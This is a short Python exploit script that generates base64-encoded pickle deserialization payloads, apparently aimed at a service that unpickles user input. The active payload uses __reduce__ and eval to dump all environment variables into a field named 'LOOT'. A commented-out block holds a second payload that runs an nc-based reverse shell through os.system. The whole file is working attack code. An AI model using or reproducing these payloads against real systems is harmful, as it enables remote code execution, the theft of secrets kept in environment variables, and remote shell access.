import pickle
import base64
class E(object):
    def __reduce__(self):
        cmd = "[{'name': str(dict(__import__('os').environ)), 'path': 'LOOT'}]"
        return (eval, (cmd,))
print(base64.b64encode(pickle.dumps(E())).decode())

'''
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
'''
